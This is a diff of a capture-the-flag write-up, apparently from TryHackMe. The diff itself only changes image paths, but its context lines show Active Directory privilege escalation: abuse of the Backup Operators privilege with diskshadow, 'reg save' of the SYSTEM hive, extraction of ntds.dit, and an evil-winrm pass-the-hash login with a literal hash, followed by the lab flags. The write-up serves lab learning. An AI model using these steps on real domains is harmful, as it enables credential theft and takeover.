@@ -100,7 +100,7 @@ Anonymous bind is not enabled on ldap, unlucky.
 
 Since we cannot see anything interesting on here, we can proceed to analyze the website on port `80`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615133536.png)
+![](cybersecurity/images/Pasted%2520image%252020250615133536.png)
 
 We got some stuff on here, let's try to fuzz to find more hidden directories:
 
@@ -148,11 +148,11 @@ JS                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 2
 
 `/backup` seems interesting, let's check it out:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615133648.png)
+![](cybersecurity/images/Pasted%2520image%252020250615133648.png)
 
 We got `employees.ods` on here, we can open this file with `libreoffice` or just `excel`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615134252.png)
+![](cybersecurity/images/Pasted%2520image%252020250615134252.png)
 
 
 Let's start exploitation.
@@ -244,16 +244,16 @@ MATCH (n)
 DETACH DELETE n
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615143015.png)
+![](cybersecurity/images/Pasted%2520image%252020250615143015.png)
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615143114.png)
+![](cybersecurity/images/Pasted%2520image%252020250615143114.png)
 
 As seen, we got another user named `jmurphy` which is a member of `Backup Operators`, if we get access to this account, we can exploit this to get a copy of the HKLM SAM and SYSTEM hives to extract the NTLM hash for the admin user.
 
 While analyzing `bloodhound`'s output, we can check this on the `Object Informatiom` for the user:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615144821.png)
+![](cybersecurity/images/Pasted%2520image%252020250615144821.png)
 
 As seen in the description, the password is set to:
 
@@ -337,7 +337,7 @@ upload SeBackupPrivilegeCmdLets.dll
 upload diskshadow.txt
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615155605.png)
+![](cybersecurity/images/Pasted%2520image%252020250615155605.png)
 
 Next step is to create the shadow copy:
 
@@ -345,7 +345,7 @@ Next step is to create the shadow copy:
 diskshadow.exe /s .\diskshadow.txt  
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615155639.png)
+![](cybersecurity/images/Pasted%2520image%252020250615155639.png)
 
 Now, we need to use the DLLs to bypass the ACLs and copy `ntds.dit`:
 
@@ -361,7 +361,7 @@ Nice, now we need to extract the SYSTEM hive:
 reg save HKLM\SYSTEM C:\tmp\system  
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615155755.png)
+![](cybersecurity/images/Pasted%2520image%252020250615155755.png)
 
 Let's download both files into our machine:
 
@@ -411,7 +411,7 @@ We got our hash, let's use evil-winrm:
 evil-winrm -i IP -u Administrator -H '9653b02d945329c7270525c4c2a69c67'
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615165728.png)
+![](cybersecurity/images/Pasted%2520image%252020250615165728.png)
 
 We can now read all flags:
 
@@ -426,5 +426,5 @@ THM{b4aee2db2901514e28db4242e047612e}
 THM{f72988e57bfc1deeebf2115e10464d15}
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250615165944.png)
+![](cybersecurity/images/Pasted%2520image%252020250615165944.png)
 
